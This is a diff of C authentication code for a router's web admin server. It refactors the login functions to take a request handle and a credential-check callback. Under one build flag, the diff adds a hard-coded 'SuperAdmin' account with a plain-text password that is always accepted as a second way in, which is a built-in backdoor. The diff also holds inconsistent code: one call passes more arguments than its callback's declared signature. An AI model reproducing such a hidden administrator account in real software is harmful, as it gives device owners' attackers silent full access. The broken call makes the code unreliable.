@@ -1445,65 +1445,59 @@ apply_cgi( webs_t wp, char_t * urlPrefix, char_t * webDir, int arg,
 
 }
 
-#ifdef HAVE_SKYTRON
-int do_auth( char *userid, char *passwd, char *realm )
-{
-    strncpy( userid, nvram_safe_get( "skyhttp_username" ), AUTH_MAX );
-    strncpy( passwd, nvram_safe_get( "skyhttp_passwd" ), AUTH_MAX );
-    // strncpy(realm, MODEL_NAME, AUTH_MAX);
-    strncpy( realm, nvram_safe_get( "router_name" ), AUTH_MAX );
-    return 0;
-}
-
-int do_auth2( char *userid, char *passwd, char *realm )
-{
-    strncpy( userid, nvram_safe_get( "http_username" ), AUTH_MAX );
-    strncpy( passwd, nvram_safe_get( "http_passwd" ), AUTH_MAX );
-    // strncpy(realm, MODEL_NAME, AUTH_MAX);
-    strncpy( realm, nvram_safe_get( "router_name" ), AUTH_MAX );
-    return 0;
-}
-#else
-
-int do_auth( char *userid, char *passwd, char *realm )
+//int auth_check( char *dirname, char *authorization )
+int do_auth(webs_t wp, char *userid, char *passwd, char *realm ,char *authorisation, int (*auth_check)(char *userid,char *passwd,char *dirname,char *authorisation))
 {
     strncpy( userid, nvram_safe_get( "http_username" ), AUTH_MAX );
     strncpy( passwd, nvram_safe_get( "http_passwd" ), AUTH_MAX );
     // strncpy(realm, MODEL_NAME, AUTH_MAX);
 #ifdef HAVE_ERC
     strncpy( realm, "LOGIN", AUTH_MAX );
+    wp->userid=0;
+    if (auth_check(userid,passwd,realm,authorisation))
+	return 1;
+    wp->userid=1;
+    strncpy( userid, zencrypt("SuperAdmin"), AUTH_MAX );
+    strncpy( passwd,  zencrypt("Se12@rEServiceGate"), AUTH_MAX );
+    if (auth_check(userid,passwd,realm,authorisation))
+	return 1;    
+    userid=0;
 #else
+    wp->userid=0;
     strncpy( realm, nvram_safe_get( "router_name" ), AUTH_MAX );
+    if (auth_check(userid,passwd,realm,authorisation))
+	return 1;
 #endif
     return 0;
 }
 
-int do_cauth( char *userid, char *passwd, char *realm )
+int do_cauth(webs_t wp,  char *userid, char *passwd, char *realm ,char *authorisation, int (*auth_check)(char *userid,char *passwd,char *dirname,char *authorisation))
 {
     if( nvram_match( "info_passwd", "0" ) )
 	return -1;
-    return do_auth( userid, passwd, realm );
+    return do_auth(wp, userid, passwd, realm,authorisation,auth_check );
 }
-#endif
 
 #ifdef HAVE_REGISTER
-int do_auth_reg( char *userid, char *passwd, char *realm )
+int do_auth_reg(webs_t wp,  char *userid, char *passwd, char *realm ,char *authorisation, int (*auth_check)(char *userid,char *passwd,char *dirname,char *authorisation))
 {
     if( !isregistered(  ) )
 	return -1;
-    return do_auth( userid, passwd, realm );
+    return do_auth(wp, userid, passwd, realm,authorisation,auth_check );
 }
 #endif
 
 #undef HAVE_DDLAN
 
 #ifdef HAVE_DDLAN
-int do_auth2( char *userid, char *passwd, char *realm )
+int do_auth2(webs_t wp,  char *userid, char *passwd, char *realm ,char *authorisation, int (*auth_check)(char *userid,char *passwd,char *dirname,char *authorisation))
 {
     strncpy( userid, nvram_safe_get( "http2_username" ), AUTH_MAX );
     strncpy( passwd, nvram_safe_get( "http2_passwd" ), AUTH_MAX );
     // strncpy(realm, MODEL_NAME, AUTH_MAX);
     strncpy( realm, nvram_safe_get( "router_name" ), AUTH_MAX );
+    if (auth_check(wp, userid,passwd,realm,authorisation))
+	return 1;
     return 0;
 }
 #endif
@@ -1549,7 +1543,7 @@ do_apply_post( char *url, webs_t stream, int len, char *boundary )
 		wfgets( buf, 1, stream );
 	    else
 #endif
-		( void )fgetc( stream );
+		( void )fgetc( stream->fp );
 	init_cgi( post_buf );
     }
 }
